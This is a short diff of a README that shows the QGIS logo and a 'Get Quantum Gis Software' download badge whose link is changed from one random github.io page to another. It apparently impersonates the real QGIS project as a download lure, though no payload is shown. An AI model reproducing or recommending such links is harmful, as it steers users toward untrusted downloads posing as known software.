@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/QGIS_logo%2C_2017.svg/3840px-QGIS_logo%2C_2017.svg.png)
 
-[![Get Quantum Gis Software](https://img.shields.io/badge/Get_Quantum_Gis_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://seezmelilwj.github.io/.github/quantum-gis-software)
+[![Get Quantum Gis Software](https://img.shields.io/badge/Get_Quantum_Gis_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://asrafali6140.github.io/.github/quantum-gis-software)
 
 ---
 
